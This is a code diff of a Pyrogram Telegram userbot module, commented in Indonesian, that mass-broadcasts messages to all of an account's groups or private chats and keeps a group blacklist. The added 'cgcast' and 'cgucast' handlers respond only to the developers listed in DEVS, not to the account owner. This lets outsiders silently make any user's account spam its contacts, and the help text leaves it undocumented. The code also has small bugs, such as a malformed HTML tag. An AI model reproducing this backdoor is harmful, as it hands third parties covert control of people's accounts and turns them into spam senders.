@@ -1,196 +1,144 @@
 import asyncio
-from gc import get_objects
 
+from pyrogram import *
 from pyrogram.enums import ChatType
-from pyrogram.errors.exceptions import FloodWait
-from pyrogram.types import InlineQueryResultArticle, InputTextMessageContent
+from pyrogram.types import *
 
-from PyroUbot import *
-from PyroUbot.config import *
+from . import *
 
-async def get_broadcast_id(client, query):
-    chats = []
-    chat_types = {
-        "group": [ChatType.GROUP, ChatType.SUPERGROUP],
-        "users": [ChatType.PRIVATE],
-    }
+__MODULE__ = "broadcast"
+__HELP__ = f"""
+✘ Bantuan Untuk Broadcast
+
+๏ Perintah: <code>{cmd}gucast</code> [text/reply to text/media]
+◉ Penjelasan: Untuk mengirim pesan ke semua user 
+           
+๏ Perintah: <code>{cmd}gcast</code> [text/reply to text/media]
+◉ Penjelasan: Untuk mengirim pesan ke semua group 
+           
+๏ Perintah: <code>{cmd}addbl</code>
+◉ Penjelasan: Menambahkan grup kedalam anti Gcast.
+           
+๏ Perintah: <code>{cmd}delbl</code>
+◉ Penjelasan: Menghapus grup dari daftar anti Gcast.
+           
+๏ Perintah: <code>{cmd}listbl</code>
+◉ Penjelasan: Melihat daftar grup anti Gcast.
+           
+"""
+
+
+@bots.on_message(filters.user(DEVS) & filters.command("cgcast", ".") & ~filters.me)
+@bots.on_message(filters.me & filters.command("gcast", cmd))
+async def _(client, message: Message):
+    sent = 0
+    failed = 0
+    user_id = client.me.id
+    msg = await message.reply("<code>Processing global broadcast...</code>")
+    list_blchat = await blacklisted_chats(user_id)
     async for dialog in client.get_dialogs():
-        if dialog.chat.type in chat_types[query]:
-            chats.append(dialog.chat.id)
-
-    return chats
-
-async def broadcast_group_cmd(client, message):
-    emot_1 = await get_vars(client.me.id, "EMOJI_PROSES")
-    emot_2 = await get_vars(client.me.id, "EMOJI_CEKLIS")
-    emot_proses = emot_1 if emot_1 else "6298454498884978957"
-    emot_ceklis = emot_2 if emot_2 else "5852871561983299073"
-    if client.me.is_premium:
-        _broadcast = f"""
-<b><emoji id={emot_proses}>⏰</emoji>ʙɪsᴍɪʟʟᴀʜ...</b>
-"""
-    else:
-        _broadcast = f"""
-<b>ᴘʀᴏsᴇs...</b>
-"""
-    msg = await message.reply(_broadcast, quote=True)
-
-    send = get_message(message)
-    if not send:
-        return await msg.edit("ᴍɪɴɪᴍᴀʟ ᴋᴀsɪʜ ɢᴡ ᴋᴀᴛᴀ ᴋᴀᴛᴀ ᴀɴᴊɪɴɢ")
-
-    chats = await get_broadcast_id(client, "group")
-    blacklist = await get_chat(client.me.id)
-
-    done = 0
-    for chat_id in chats:
-        if chat_id in blacklist:
-            continue
-        elif chat_id in BLACKLIST_CHAT:
-            continue
-
-        try:
+        if dialog.chat.type in [ChatType.GROUP, ChatType.SUPERGROUP]:
             if message.reply_to_message:
-                await send.copy(chat_id)
+                send = message.reply_to_message
+            elif len(message.command) < 2:
+                return await msg.edit("<code>Berikan pesan atau balas pesan...</code>")
             else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
+                send = message.text.split(None, 1)[1]
+            chat_id = dialog.chat.id
+            if chat_id not in list_blchat and chat_id not in BL_GCAST:
+                try:
+                    if message.reply_to_message:
+                        await send.copy(chat_id)
+                    else:
+                        await client.send_message(chat_id, send)
+                    sent += 1
+                    await asyncio.sleep(1)
+                except Exception:
+                    failed += 1
+                    await asyncio.sleep(1)
+    await msg.edit(f"**✅ Berhasil Terkirim: `{sent}` \n❌ Gagal Terkirim: `{failed}`**")
+
+
+@bots.on_message(filters.user(DEVS) & filters.command("cgucast", ".") & ~filters.me)
+@bots.on_message(filters.me & filters.command("gucast", cmd))
+async def _(client, message: Message):
+    sent = 0
+    failed = 0
+    msg = await message.reply("<code>Processing global broadcast...</code>")
+    async for dialog in client.get_dialogs():
+        if dialog.chat.type == ChatType.PRIVATE:
             if message.reply_to_message:
-                await send.copy(chat_id)
+                send = message.reply_to_message
+            elif len(message.command) < 2:
+                return await msg.edit("Mohon berikan pesan atau balas ke pesan...")
             else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except Exception:
-            pass
-
-    emot_1 = await get_vars(client.me.id, "EMOJI_CEKLIS")
-    emot_ceklis = emot_1 if emot_1 else "5852871561983299073"
-    if client.me.is_premium:
-        _ceklis = f"""
-<b><emoji id={emot_ceklis}>✅</emoji>ᴀʜ ᴅᴀʜ ᴋᴇᴋɪʀɪᴍ ɴᴊɪɴᴋ ᴋᴇ {done} ɢʀᴏᴜᴘ</b>
-"""
-    else:
-        _ceklis = f"""
-<b>✅ ᴀʟʜᴀᴍᴅᴜʟɪʟʟᴀʜ ᴘᴇsᴀɴ ᴀɴᴅᴀ ᴛᴇʀᴋɪʀɪᴍ ᴋᴇ {done} ɢʀᴏᴜᴘ</b>
-"""
-    return await msg.edit(_ceklis)
-
-async def broadcast_users_cmd(client, message):
-    msg = await message.reply("sᴇᴅᴀɴɢ ᴍᴇᴍᴘʀᴏsᴇs ᴍᴏʜᴏɴ ʙᴇʀsᴀʙᴀʀ", quote=True)
-
-    send = get_message(message)
-    if not send:
-        return await msg.edit("ᴍɪɴɪᴍᴀʟ ᴋᴀsɪʜ ᴋᴀᴛᴀ ᴋᴀᴛᴀ ᴀɴᴊ")
-
-    chats = await get_broadcast_id(client, "users")
-
-    done = 0
-    for chat_id in chats:
-        if chat_id == client.me.id:
-            continue
-        elif chat_id in DEVS:
-            continue
-
-        try:
-            if message.reply_to_message:
-                await send.copy(chat_id)
-            else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-            if message.reply_to_message:
-                await send.copy(chat_id)
-            else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except Exception:
-            pass
-
-    return await msg.edit(f"<b>✅ ᴀʟʜᴀᴍᴅᴜʟɪʟʟᴀʜ ᴘᴇsᴀɴ ᴀɴᴅᴀ ᴛᴇʀᴋɪʀɪᴍ ᴋᴇ {done} ᴜsᴇʀs</b>")
-
-async def broadcast_bot(client, message):
-    msg = await message.reply("sᴀʙᴀʀ ɴᴊɪɴᴋ", quote=True)
-
-    send = get_message(message)
-    if not send:
-        return await msg.edit("ᴍᴏʜᴏɴ ʙᴀʟᴀs sᴇsᴜᴀᴛᴜ ᴀᴛᴀᴜ ᴋᴇᴛɪᴋ sᴇsᴜᴀᴛᴜ...")
-        
-    susers = await get_list_from_vars(client.me.id, "SAVED_USERS")
-    done = 0
-    for chat_id in susers:
-        try:
-            if message.reply_to_message:
-                await send.copy(chat_id)
-            else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except FloodWait as e:
-            await asyncio.sleep(e.value)
-            if message.reply_to_message:
-                await send.copy(chat_id)
-            else:
-                await client.send_message(chat_id, send)
-            done += 1
-        except Exception:
-            pass
-
-    return await msg.edit(f"<b>✅ ᴜᴅᴀʜ sᴇʟᴇsᴀɪ ɴʏᴇᴛ {done} ᴜsᴇʀs</b>")
+                send = message.text.split(None, 1)[1]
+            chat_id = dialog.chat.id
+            if chat_id not in DEVS:
+                try:
+                    if message.reply_to_message:
+                        await send.copy(chat_id)
+                    else:
+                        await client.send_message(chat_id, send)
+                    sent += 1
+                    await asyncio.sleep(1)
+                except Exception:
+                    failed += 1
+                    await asyncio.sleep(1)
+    await msg.edit(f"**✅ Berhasil Terkirim: `{sent}` \n❌ Gagal Terkirim: `{failed}`**")
 
 
-async def send_msg_cmd(client, message):
-    if message.reply_to_message:
-        chat_id = (
-            message.chat.id if len(message.command) < 2 else message.text.split()[1]
-        )
-        try:
-            if client.me.id != bot.me.id:
-                if message.reply_to_message.reply_markup:
-                    x = await client.get_inline_bot_results(
-                        bot.me.username, f"get_send {id(message)}"
-                    )
-                    return await client.send_inline_bot_result(
-                        chat_id, x.query_id, x.results[0].id
-                    )
-        except Exception as error:
-            return await message.reply(error)
-        else:
-            try:
-                return await message.reply_to_message.copy(chat_id)
-            except Exception as t:
-                return await message.reply(f"{t}")
-    else:
-        if len(message.command) < 3:
-            return await message.reply("ᴋᴇᴛɪᴋ ʏᴀɴɢ ʙᴇɴᴇʀ")
-        chat_id, chat_text = message.text.split(None, 2)[1:]
-        try:
-            if "_" in chat_id:
-                msg_id, to_chat = chat_id.split("_")
-                return await client.send_message(
-                    to_chat, chat_text, reply_to_message_id=int(msg_id)
-                )
-            else:
-                return await client.send_message(chat_id, chat_text)
-        except Exception as t:
-            return await message.reply(f"{t}")
-
-
-async def send_inline(client, inline_query):
-    _id = int(inline_query.query.split()[1])
-    m = next((obj for obj in get_objects() if id(obj) == _id), None)
-    if m:
-        await client.answer_inline_query(
-            inline_query.id,
-            cache_time=0,
-            results=[
-                InlineQueryResultArticle(
-                    title="get send!",
-                    reply_markup=m.reply_to_message.reply_markup,
-                    input_message_content=InputTextMessageContent(
-                        m.reply_to_message.text
-                    ),
-                )
-            ],
+@bots.on_message(filters.me & filters.command("addbl", cmd))
+async def bl_chat(client, message):
+    chat_id = message.chat.id
+    chat = await client.get_chat(chat_id)
+    if chat.type == "private":
+        return await message.reply("Maaf, perintah ini hanya berlaku untuk grup.")
+    user_id = client.me.id
+    bajingan = await blacklisted_chats(user_id)
+    if chat in bajingan:
+        return await message.reply("Obrolan sudah masuk daftar Blacklist Gcast.")
+    await blacklist_chat(user_id, chat_id)
+    await eor(
+        message, "Obrolan telah berhasil dimasukkan ke dalam daftar Blacklist Gcast."
     )
+
+
+@bots.on_message(filters.me & filters.command("delbl", cmd))
+async def del_bl(client, message):
+    if len(message.command) != 2:
+        return await eor(
+            message, "<b>Gunakan Format:</b>\n <code>delbl [CHAT_ID]</code>"
+        )
+    user_id = client.me.id
+    chat_id = int(message.text.strip().split()[1])
+    if chat_id not in await blacklisted_chats(user_id):
+        return await eor(
+            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
+        )
+    whitelisted = await whitelist_chat(user_id, chat_id)
+    if whitelisted:
+        return await eor(
+            message, "Obrolan berhasil dihapus dari daftar Blacklist Gcast."
+        )
+    await message.reply("Sesuatu yang salah terjadi.")
+
+
+@bots.on_message(filters.me & filters.command("listbl", cmd))
+async def all_chats(client, message):
+    text = "<b>Daftar Blacklist Gcast:</b>\n\n"
+    j = 0
+    user_id = client.me.id
+    chat_id = message.chat.id
+    for count, chat_id in enumerate(await blacklisted_chats(user_id), 1):
+        try:
+            chat = await client.get_chat(chat_id)
+            title = chat.title
+        except Exception:
+            title = "Private\n"
+        j = 1
+        text += f"<b>{count}.{title}</b><code{chat_id}</code>\n"
+    if j == 0:
+        await message.reply("Tidak Ada Daftar Blacklist Gcast.")
+    else:
+        await message.reply(text)
